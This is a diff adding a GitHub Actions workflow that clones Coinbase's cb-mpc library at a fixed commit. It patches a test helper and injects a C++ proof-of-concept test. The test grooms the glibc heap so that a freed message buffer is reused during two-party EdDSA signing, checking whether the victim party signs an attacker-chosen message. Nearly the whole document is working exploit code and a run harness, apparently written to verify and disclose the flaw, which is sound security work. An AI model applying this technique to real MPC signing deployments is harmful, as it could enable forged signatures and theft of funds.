@@ -1,0 +1,170 @@
+name: CBMPC EdDSA Heap Reuse Substitution V35
+
+on:
+  workflow_dispatch:
+  push:
+    paths:
+      - '.github/workflows/cbmpc-eddsa-heap-reuse-substitution-v35.yml'
+
+permissions:
+  contents: read
+
+jobs:
+  verdict:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 45
+    steps:
+      - name: Clone current cb-mpc HEAD
+        shell: bash
+        run: |
+          set -euo pipefail
+          git clone https://github.com/coinbase/cb-mpc.git cb-mpc >/dev/null 2>&1
+          cd cb-mpc
+          git checkout fdbb60346757271d5e0241f417e55dc8f289573c >/dev/null 2>&1
+          git submodule update --init --recursive >/dev/null 2>&1
+          echo "tested_commit=$(git rev-parse HEAD)"
+
+      - name: Add public EdDSA2P heap-reuse substitution PoC
+        shell: bash
+        run: |
+          set -euo pipefail
+          python3 - <<'PY'
+          from pathlib import Path
+          p=Path('cb-mpc/tests/utils/local_network/channel.cpp')
+          p.write_text(p.read_text().replace('    delete queue.front();','    test_message_buffer_t::free(queue.front());'))
+          PY
+          cat >> cb-mpc/tests/unit/api/test_eddsa2pc.cpp <<'CPP'
+
+          #include <fstream>
+
+          namespace {
+          class v35_groom_transport_t final : public coinbase::api::data_transport_i {
+           public:
+            explicit v35_groom_transport_t(std::shared_ptr<mpc_net_context_t> ctx) : ctx_(std::move(ctx)) {}
+
+            void arm(mem_t target, const_byte_ptr expected_reuse) {
+              target_ = target;
+              expected_reuse_ = expected_reuse;
+              armed_ = true;
+              groomed_ = false;
+            }
+
+            bool reused() const { return groomed_ && groom_.data() == expected_reuse_; }
+
+            error_t send(coinbase::api::party_idx_t receiver, mem_t msg) override {
+              ctx_->send(receiver, msg);
+              return SUCCESS;
+            }
+
+            error_t receive(coinbase::api::party_idx_t sender, buf_t& msg) override {
+              if (armed_ && !groomed_) {
+                // Simulate a same-size network/scratch allocation after sign() released
+                // the caller's aliased message buffer. With glibc's size-class reuse,
+                // this takes ownership of the just-freed 512-byte chunk.
+                groom_ = buf_t(target_);
+                groomed_ = true;
+              }
+              return ctx_->receive(sender, msg);
+            }
+
+            error_t receive_all(const std::vector<coinbase::api::party_idx_t>& senders,
+                                std::vector<buf_t>& msgs) override {
+              std::vector<coinbase::mpc::party_idx_t> s;
+              s.reserve(senders.size());
+              for (auto x : senders) s.push_back(static_cast<coinbase::mpc::party_idx_t>(x));
+              return ctx_->receive_all(s, msgs);
+            }
+
+           private:
+            std::shared_ptr<mpc_net_context_t> ctx_;
+            mem_t target_;
+            const_byte_ptr expected_reuse_ = nullptr;
+            bool armed_ = false;
+            bool groomed_ = false;
+            buf_t groom_;
+          };
+          }  // namespace
+
+          TEST(ApiEdDSA2pc, HeapReuseMessageSubstitutionVerdictV35) {
+            auto c1 = std::make_shared<mpc_net_context_t>(0);
+            auto c2 = std::make_shared<mpc_net_context_t>(1);
+            std::vector<std::shared_ptr<mpc_net_context_t>> peers = {c1, c2};
+            c1->init_with_peers(peers);
+            c2->init_with_peers(peers);
+
+            v35_groom_transport_t t1(c1);
+            local_api_transport_t t2(c2);
+            const coinbase::api::job_2p_t job1{party_t::p1, "p1", "p2", t1};
+            const coinbase::api::job_2p_t job2{party_t::p2, "p1", "p2", t2};
+
+            buf_t key1, key2;
+            error_t rv1 = UNINITIALIZED_ERROR, rv2 = UNINITIALIZED_ERROR;
+            run_2pc(c1, c2,
+                    [&] { return coinbase::api::eddsa_2p::dkg(job1, curve_id::ed25519, key1); },
+                    [&] { return coinbase::api::eddsa_2p::dkg(job2, curve_id::ed25519, key2); },
+                    rv1, rv2);
+            ASSERT_EQ(rv1, SUCCESS);
+            ASSERT_EQ(rv2, SUCCESS);
+
+            buf_t pub;
+            ASSERT_EQ(coinbase::api::eddsa_2p::get_public_key_compressed(key1, pub), SUCCESS);
+            coinbase::crypto::ecc_point_t Q;
+            ASSERT_EQ(Q.from_bin(coinbase::crypto::curve_ed25519, pub), SUCCESS);
+            const coinbase::crypto::ecc_pub_key_t verify_key(Q);
+
+            buf_t victim_msg(512), attacker_msg(512);
+            for (int i = 0; i < 512; ++i) {
+              victim_msg[i] = static_cast<uint8_t>((i * 3 + 1) & 0xff);
+              attacker_msg[i] = static_cast<uint8_t>((i * 7 + 0xa5) & 0xff);
+            }
+            const buf_t original_msg = victim_msg;
+            const_byte_ptr freed_addr = victim_msg.data();
+            mem_t victim_view = victim_msg;
+            t1.arm(attacker_msg, freed_addr);
+
+            buf_t p2_sig;
+            run_2pc(c1, c2,
+                    [&] { return coinbase::api::eddsa_2p::sign(job1, key1, victim_view, victim_msg); },
+                    [&] { return coinbase::api::eddsa_2p::sign(job2, key2, attacker_msg, p2_sig); },
+                    rv1, rv2);
+
+            const bool reused = t1.reused();
+            const error_t target_verify = victim_msg.empty() ? E_GENERAL : verify_key.verify(attacker_msg, victim_msg);
+            const error_t original_verify = victim_msg.empty() ? E_GENERAL : verify_key.verify(original_msg, victim_msg);
+            const bool substituted = reused && rv1 == SUCCESS && rv2 == SUCCESS && victim_msg.size() == 64 &&
+                                     target_verify == SUCCESS && original_verify != SUCCESS;
+
+            std::ofstream out("/code/v35-verdict.txt", std::ios::trunc);
+            out << "commit=fdbb60346757271d5e0241f417e55dc8f289573c"
+                << " reused=" << (reused ? 1 : 0)
+                << " rv1=" << rv1 << " rv2=" << rv2
+                << " sig_size=" << victim_msg.size()
+                << " target_verify=" << target_verify
+                << " original_verify=" << original_verify
+                << " substituted=" << (substituted ? 1 : 0) << "\n";
+          }
+          CPP
+
+      - name: Build and run release semantic exploit
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd cb-mpc
+          make image >/tmp/image-build.log 2>&1
+          set +e
+          timeout 40m docker run --rm -v "$PWD":/code -t cb-mpc bash -lc 'make test filter=ApiEdDSA2pc.HeapReuseMessageSubstitutionVerdictV35' >/tmp/test.log 2>&1
+          status=$?
+          set -e
+          echo "test_exit=$status"
+          if [ -f v35-verdict.txt ]; then cat v35-verdict.txt; else echo 'verdict_missing=1'; fi
+          sub=$(sed -n 's/.*substituted=\([0-9][0-9]*\).*/\1/p' v35-verdict.txt 2>/dev/null || true)
+          if [ "${sub:-0}" -eq 1 ]; then
+            echo 'EDDSA_UNAUTHORIZED_SIGNATURE_SUBSTITUTION_CANDIDATE=1'
+            exit 2
+          fi
+          if [ "$status" -ne 0 ]; then
+            echo 'V35_TEST_OR_BUILD_FAILURE=1'
+            tail -n 140 /tmp/test.log
+            exit 1
+          fi
+          echo 'EDDSA_UNAUTHORIZED_SIGNATURE_SUBSTITUTION_CANDIDATE=0'
